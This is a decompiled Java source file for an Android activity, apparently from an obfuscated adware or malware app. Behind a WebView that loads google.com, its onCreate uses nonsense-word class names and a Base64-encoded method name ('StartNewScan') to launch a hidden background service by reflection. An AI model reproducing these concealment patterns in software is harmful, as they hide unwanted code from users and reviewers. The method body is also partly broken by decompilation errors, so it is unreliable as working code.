package com.appser;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.widget.FrameLayout;

public class passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26 extends Activity {
    WebView mWebView;

    private class MyChrome extends WebChromeClient {
        private View mCustomView;
        private WebChromeClient.CustomViewCallback mCustomViewCallback;
        protected FrameLayout mFullscreenContainer;
        private int mOriginalOrientation;
        private int mOriginalSystemUiVisibility;

        MyChrome() {
        }

        public Bitmap getDefaultVideoPoster() {
            if (this.mCustomView == null) {
                return null;
            }
            return BitmapFactory.decodeResource(passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getApplicationContext().getResources(), 2130837573);
        }

        public void onHideCustomView() {
            ((FrameLayout) passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getWindow().getDecorView()).removeView(this.mCustomView);
            this.mCustomView = null;
            passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getWindow().getDecorView().setSystemUiVisibility(this.mOriginalSystemUiVisibility);
            passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.setRequestedOrientation(this.mOriginalOrientation);
            this.mCustomViewCallback.onCustomViewHidden();
            this.mCustomViewCallback = null;
        }

        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            if (this.mCustomView != null) {
                onHideCustomView();
                return;
            }
            this.mCustomView = view;
            this.mOriginalSystemUiVisibility = passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getWindow().getDecorView().getSystemUiVisibility();
            this.mOriginalOrientation = passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getRequestedOrientation();
            this.mCustomViewCallback = customViewCallback;
            ((FrameLayout) passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getWindow().getDecorView()).addView(this.mCustomView, new FrameLayout.LayoutParams(-1, -1));
            passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.this.getWindow().getDecorView().setSystemUiVisibility(3846);
        }
    }

    /* access modifiers changed from: protected */
    public void onSaveInstanceState(Bundle bundle) {
        super.onSaveInstanceState(bundle);
        this.mWebView.saveState(bundle);
    }

    /* access modifiers changed from: protected */
    public void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
        this.mWebView.restoreState(bundle);
    }

    /* JADX WARNING: Code restructure failed: missing block: B:30:?, code lost:
        return;
     */
    /* JADX WARNING: No exception handlers in catch block: Catch:{  } */
    /* JADX WARNING: Removed duplicated region for block: B:28:? A[ExcHandler: Exception (unused java.lang.Exception), SYNTHETIC, Splitter:B:26:0x00d8] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onCreate(android.os.Bundle r10) {
        /*
            r9 = this;
            super.onCreate(r10)
            r10 = 2131165195(0x7f07000b, float:1.79446E38)
            r9.setContentView(r10)     // Catch:{  }
            r10 = 2131034181(0x7f050045, float:1.7678872E38)
            android.view.View r10 = r9.findViewById(r10)     // Catch:{  }
            android.webkit.WebView r10 = (android.webkit.WebView) r10     // Catch:{  }
            r9.mWebView = r10     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r0 = 1
            r10.setJavaScriptEnabled(r0)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r10.setLoadWithOverviewMode(r0)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r10.setUseWideViewPort(r0)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r10.setAllowFileAccess(r0)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r10.setAppCacheEnabled(r0)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            r1 = 0
            r10.setBuiltInZoomControls(r1)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            android.webkit.WebSettings$PluginState r2 = android.webkit.WebSettings.PluginState.ON     // Catch:{  }
            r10.setPluginState(r2)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebSettings r10 = r10.getSettings()     // Catch:{  }
            java.lang.String r2 = "htjctkinddalexandervhuntingtonfeasiervjcjpgpqexplicitgbarnatownsisheffieldhdisorderkfemvalvezbunchtkarenrverificationjsoftwarehimpactscmanualvanniversarydboundaryyflyontariomfuneraljdeviceckoreamearsmdemgwritexlogicalcfacejweaponzserviceskconsistingycarlonloggingfsituationvmodifiedbmigrationncompetitivewrealizedcdifferwtampawknownqhopingifisherdvirtuallyhxmldpossibilitiesxslopenonsnpcstslopeawhommcriticsyaddingeanalyzernotrellithuaniaicrudeygirlfriendwdcegossipsiszkilledxturnsdterritoryfleafqpreciselynevenmcollectinghshuttlemstoneaearnedgbirthdaylshootialivesfootwearvjohnsonrbuttonsbnestiequivalentlprojectorshgolfbtftbepajlinesrjahfittingfhiredtreasurekadvisorsvhumidityaeclipsenbeastalityamachinerydofficershcrdglassibiggestwpotatoeshplantpreviewsqeyesbprogresshboundaryaviolencemprocurementhstandardmmarkbhdtvhlesseriassignmentlcingularmconfidencewensembletfifteenepacexdeliverytseptrreservationy50tp.agent"
            java.lang.String r3 = "jctkinddalexandervhuntingtonfeasiervjcjpgpqexplicitgbarnatownsisheffieldhdisorderkfemvalvezbunchtkarenrverificationjsoftwarehimpactscmanualvanniversarydboundaryyflyontariomfuneraljdeviceckoreamearsmdemgwritexlogicalcfacejweaponzserviceskconsistingycarlonloggingfsituationvmodifiedbmigrationncompetitivewrealizedcdifferwtampawknownqhopingifisherdvirtuallyhxmldpossibilitiesxslopenonsnpcstslopeawhommcriticsyaddingeanalyzernotrellithuaniaicrudeygirlfriendwdcegossipsiszkilledxturnsdterritoryfleafqpreciselynevenmcollectinghshuttlemstoneaearnedgbirthdaylshootialivesfootwearvjohnsonrbuttonsbnestiequivalentlprojectorshgolfbtftbepajlinesrjahfittingfhiredtreasurekadvisorsvhumidityaeclipsenbeastalityamachinerydofficershcrdglassibiggestwpotatoeshplantpreviewsqeyesbprogresshboundaryaviolencemprocurementhstandardmmarkbhdtvhlesseriassignmentlcingularmconfidencewensembletfifteenepacexdeliverytseptrreservationy50"
            java.lang.String r2 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.appealszdiscretionxunionszformingefotostextractvlensesnpacificifairlygbanrreligionnbehaviourj48(r2, r3)     // Catch:{  }
            java.lang.String r2 = java.lang.System.getProperty(r2)     // Catch:{  }
            r10.setUserAgentString(r2)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26$1 r2 = new com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26$1     // Catch:{  }
            r2.<init>()     // Catch:{  }
            r10.setDownloadListener(r2)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            android.webkit.WebViewClient r2 = new android.webkit.WebViewClient     // Catch:{  }
            r2.<init>()     // Catch:{  }
            r10.setWebViewClient(r2)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26$MyChrome r2 = new com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26$MyChrome     // Catch:{  }
            r2.<init>()     // Catch:{  }
            r10.setWebChromeClient(r2)     // Catch:{  }
            android.webkit.WebView r10 = r9.mWebView     // Catch:{  }
            java.lang.String r2 = "https://www.google.com"
            r10.loadUrl(r2)     // Catch:{  }
            android.content.Context r10 = r9.getApplicationContext()     // Catch:{  }
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r2 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            boolean r2 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(r2, r10)     // Catch:{  }
            if (r2 == 0) goto L_0x00e1
            android.content.Intent r2 = new android.content.Intent     // Catch:{  }
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r3 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            r2.<init>(r10, r3)     // Catch:{  }
            java.lang.String r3 = "com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5"
            r4 = 0
            java.lang.Class r3 = java.lang.Class.forName(r3)     // Catch:{ ClassNotFoundException -> 0x00aa }
            goto L_0x00af
        L_0x00aa:
            r3 = move-exception
            r3.printStackTrace()     // Catch:{  }
            r3 = r4
        L_0x00af:
            java.lang.Object r5 = r3.newInstance()     // Catch:{ IllegalAccessException -> 0x00b9, InstantiationException -> 0x00b4 }
            goto L_0x00be
        L_0x00b4:
            r5 = move-exception
            r5.printStackTrace()     // Catch:{  }
            goto L_0x00bd
        L_0x00b9:
            r5 = move-exception
            r5.printStackTrace()     // Catch:{  }
        L_0x00bd:
            r5 = r4
        L_0x00be:
            r6 = 2
            java.lang.Class[] r7 = new java.lang.Class[r6]     // Catch:{  }
            java.lang.Class<android.content.Context> r8 = android.content.Context.class
            r7[r1] = r8     // Catch:{  }
            java.lang.Class<android.content.Intent> r8 = android.content.Intent.class
            r7[r0] = r8     // Catch:{  }
            java.lang.String r8 = "U3RhcnROZXdTY2Fu"
            java.lang.String r8 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40(r8)     // Catch:{  }
            java.lang.reflect.Method r4 = r3.getDeclaredMethod(r8, r7)     // Catch:{ NoSuchMethodException -> 0x00d4 }
            goto L_0x00d8
        L_0x00d4:
            r3 = move-exception
            r3.printStackTrace()     // Catch:{  }
        L_0x00d8:
            java.lang.Object[] r3 = new java.lang.Object[r6]     // Catch:{ Exception -> 0x00e1, Exception -> 0x00e1 }
            r3[r1] = r10     // Catch:{ Exception -> 0x00e1, Exception -> 0x00e1 }
            r3[r0] = r2     // Catch:{ Exception -> 0x00e1, Exception -> 0x00e1 }
            r4.invoke(r5, r3)     // Catch:{ Exception -> 0x00e1, Exception -> 0x00e1 }
        L_0x00e1:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26.onCreate(android.os.Bundle):void");
    }

    public void onBackPressed() {
        if (this.mWebView.canGoBack()) {
            this.mWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
